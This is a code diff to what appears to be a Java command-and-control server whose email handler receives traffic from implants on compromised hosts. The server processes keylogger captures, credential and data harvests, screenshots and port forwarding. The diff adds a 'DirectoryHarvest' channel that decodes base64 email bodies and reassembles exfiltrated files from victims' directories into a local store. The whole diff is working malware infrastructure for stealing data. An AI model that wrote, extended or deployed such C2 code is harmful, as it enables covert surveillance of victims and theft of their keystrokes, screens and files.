@@ -21,6 +21,7 @@ import c2.HarvestProcessor;
 import c2.KeyloggerProcessor;
 import c2.http.HTTPSManager;
 import c2.session.IOManager;
+import c2.session.filereceiver.FileReceiverDatagramHandler;
 import jakarta.mail.Flags.Flag;
 import jakarta.mail.Folder;
 import jakarta.mail.Message;
@@ -40,6 +41,7 @@ public class EmailHandler extends C2Interface {
 	public static final String SCREENSHOT_PREFIX = "Screenshot: ";
 	public static final String HARVEST_PREFIX = "HARVEST:";
 	public static final String PORT_FORWARD_PREFIX = "PortForward: ";
+	public static final String DIR_HARVEST_PREFIX = "DirectoryHarvest: ";
 	
 	private int smtpPort;
 	private String emailHost;
@@ -80,7 +82,8 @@ public class EmailHandler extends C2Interface {
 	private IOManager io;
 
 	private KeyloggerProcessor keylogger;
-
+	private FileReceiverDatagramHandler fileReceiverProcessor;
+	
 	public void initialize(IOManager io, Properties prop, KeyloggerProcessor keylogger, HarvestProcessor harvester)
 			throws Exception {
 		this.io = io;
@@ -107,7 +110,7 @@ public class EmailHandler extends C2Interface {
 
 		t = (SMTPTransport) session.getTransport("smtp");// or smtps?
 		t.connect(emailHost, emailUsername, emailPassword);
-
+		fileReceiverProcessor = new FileReceiverDatagramHandler(Paths.get(prop.getProperty(Constants.DAEMON_EXFILTEST_DIRECTORY)));
 	}
 
 	public static final String HOSTNAME = "HOSTNAME";
@@ -151,6 +154,8 @@ public class EmailHandler extends C2Interface {
 				String harvestType = null;
 				boolean isPortForward = false;
 				String forwardAddress = null;
+				boolean isDirHarvest = false;
+				int dirHarvestId = 0;
 				//System.out.println("Processing email: " + sessionElements);
 				if (sessionElements.startsWith(KEYLOGGER_PREFIX)) {
 					sessionElements = sessionElements.replace(KEYLOGGER_PREFIX, "");
@@ -158,6 +163,12 @@ public class EmailHandler extends C2Interface {
 				} else if (sessionElements.startsWith(SCREENSHOT_PREFIX)) {
 					sessionElements = sessionElements.replace(SCREENSHOT_PREFIX, "");
 					isScreenshot = true;
+				}else if(sessionElements.startsWith(DIR_HARVEST_PREFIX)) {
+					sessionElements = sessionElements.replace(DIR_HARVEST_PREFIX, "");
+					int firstSpaceIdx = sessionElements.indexOf(" ");
+					dirHarvestId = Integer.parseInt(sessionElements.substring(0, firstSpaceIdx));
+					sessionElements = sessionElements.substring(firstSpaceIdx + 1);
+					isDirHarvest = true;
 				} else if (sessionElements.startsWith(HARVEST_PREFIX)) {
 					sessionElements = sessionElements.replace(HARVEST_PREFIX, "");
 					int firstSpaceIdx = sessionElements.indexOf(" ");
@@ -199,8 +210,23 @@ public class EmailHandler extends C2Interface {
 					continue;// Improperly formatted email, discard
 				}
 				String sessionUID = hostname + ":" + username + ":" + protocol;
+				Integer sessionId = io.getSessionId(sessionUID);
+				if (sessionId == null) {
+					sessionId = io.addSession(username, hostname, protocol);
+					sessionToEmails.put(sessionUID, nextEmail.sender);
+				}
 				if (isKeylogger) {
 					keylogger.writeEntry(hostname, nextEmail.body.toString());
+				}else if(isDirHarvest) {
+					if(!fileReceiverProcessor.hasSessionCurrently(sessionId, dirHarvestId)) {
+						fileReceiverProcessor.registerNewSession(sessionId, dirHarvestId, hostname);
+					}
+					try {
+						byte[] harvestData = Base64.getDecoder().decode(nextEmail.body.toString().replaceAll("\r", "").replaceAll("\n", ""));
+						fileReceiverProcessor.processIncoming(sessionId, dirHarvestId, harvestData);
+					}catch(IllegalArgumentException ex) {
+						ex.printStackTrace();
+					}
 				} else if (isHarvest) {
 					harvester.processHarvest(harvestType, hostname, pid, username, nextEmail.body.toString());
 				} else if (isScreenshot) {
@@ -217,17 +243,11 @@ public class EmailHandler extends C2Interface {
 						ex.printStackTrace();
 					}
 				}else if (isPortForward) {
-					Integer sessionId = io.getSessionId(sessionUID);
 					String b64Content = nextEmail.body.toString();
 					b64Content = b64Content.replaceAll("\n", "");
 					b64Content = b64Content.replaceAll("\r", "");
 					io.queueForwardedTCPTraffic(sessionId, forwardAddress, b64Content);
 				} else {
-					Integer sessionId = io.getSessionId(sessionUID);
-					if (sessionId == null) {
-						sessionId = io.addSession(username, hostname, protocol);
-						sessionToEmails.put(sessionUID, nextEmail.sender);
-					}
 					io.sendIO(sessionId, nextEmail.body);
 				}
 
